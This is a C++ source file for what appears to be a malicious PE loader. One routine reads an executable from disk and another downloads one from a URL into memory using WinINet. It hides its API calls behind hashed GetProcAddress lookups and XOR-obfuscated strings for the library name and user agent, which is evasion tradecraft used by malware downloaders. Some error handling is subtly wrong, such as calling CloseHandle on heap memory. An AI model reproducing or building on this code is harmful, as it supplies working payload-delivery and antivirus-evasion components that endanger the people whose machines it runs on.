#include "loader.hpp"

/**
 * Function to retrieve the PE file content.
 * \param lpFilePath : path of the PE file.
 * \return : address of the content in the explorer memory.
 */
HANDLE GetFileContent(const LPSTR lpFilePath)
{
	const HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		// printf("[-] An error occured when trying to open the PE file !\n");
		CloseHandle(hFile);
		return nullptr;
	}

	const DWORD dFileSize = GetFileSize(hFile, nullptr);
	if (dFileSize == INVALID_FILE_SIZE)
	{
		// printf("[-] An error occured when trying to get the PE file size !\n");
		CloseHandle(hFile);
		return nullptr;
	}

	const HANDLE hFileContent = HeapAlloc(GetProcessHeap(), 0, dFileSize);
	if (hFileContent == INVALID_HANDLE_VALUE)
	{
		// printf("[-] An error occured when trying to allocate memory for the PE file content !\n");
		CloseHandle(hFile);
		CloseHandle(hFileContent);
		return nullptr;
	}

	const BOOL bFileRead = ReadFile(hFile, hFileContent, dFileSize, nullptr, nullptr);
	if (!bFileRead)
	{
		// printf("[-] An error occured when trying to read the PE file content !\n");
		CloseHandle(hFile);
		if (hFileContent != nullptr)
			CloseHandle(hFileContent);

		return nullptr;
	}

	CloseHandle(hFile);
	return hFileContent;
}

/**
 * Function to retrieve the PE file content.
 * \param lpFilePath : path of the PE file.
 * \return : address of the content in the explorer memory.
 */
LPVOID GetDownloadFileContent(const char *url)
{
	LPCSTR lpLibFileName = TEXT(fheXOR("110c1a0a0603115a07040a", fXOR("56'0;", 'S')));
	m_internetOpenPtr internetOpen = (m_internetOpenPtr)m_GetProcAddressEx(lpLibFileName, -144894463);
	HINTERNET hInternet = internetOpen(fheXOR("2b0a0e0a040a045b564656455c2e09050c1a1707150d4f43210811110f482b0417432735452c4359563a455637514c542218160911340d042e1d17475356434d5b50455c28203228384f480a0c1f064821001708074f45370b1a0908114c5954575a5346564b44433b070315110149504754465553", fXOR("56'0;", 'S')), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInternet)
	{
		// fprintf(stderr, "Failed to open internet connection\n");
		return nullptr;
	}

	m_internetOpenUrlPtr internetOpenUrl = (m_internetOpenUrlPtr)m_GetProcAddressEx(lpLibFileName, -428245036);
	HINTERNET hUrl = internetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	m_internetCloseHandlePtr internetCloseHandle = (m_internetCloseHandlePtr)m_GetProcAddressEx(lpLibFileName, 736583232);
	if (!hUrl)
	{
		// fprintf(stderr, "Failed to open URL\n");
		internetCloseHandle(hInternet);
		return nullptr;
	}

	DWORD dwFileSize = 0;
	DWORD dwSize = sizeof(dwFileSize);
	m_httpQueryInfoPtr httpQueryInfo = (m_httpQueryInfoPtr)m_GetProcAddressEx(lpLibFileName, -593702723);
	if (!httpQueryInfo(hUrl, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &dwFileSize, &dwSize, NULL))
	{
		// fprintf(stderr, "Failed to get file size\n");
		internetCloseHandle(hUrl);
		internetCloseHandle(hInternet);
		return nullptr;
	}

	// Allocate memory to hold the file content
	LPVOID lpFileContent = HeapAlloc(GetProcessHeap(), 0, dwFileSize);
	if (!lpFileContent)
	{
		// fprintf(stderr, "Failed to allocate memory for file content\n");
		internetCloseHandle(hUrl);
		internetCloseHandle(hInternet);
		return nullptr;
	}

	DWORD bytesRead;
	m_internetReadFilePtr internetReadFile = (m_internetReadFilePtr)m_GetProcAddressEx(lpLibFileName, 981983357);
	BOOL success = internetReadFile(hUrl, lpFileContent, dwFileSize, &bytesRead);
	if (!success || bytesRead != dwFileSize)
	{
		// fprintf(stderr, "Failed to read entire file\n");
		internetCloseHandle(hUrl);
		internetCloseHandle(hInternet);
		HeapFree(GetProcessHeap(), 0, lpFileContent); // Free allocated memory
		return nullptr;
	}

	internetCloseHandle(hUrl);
	internetCloseHandle(hInternet);
	return lpFileContent;
}
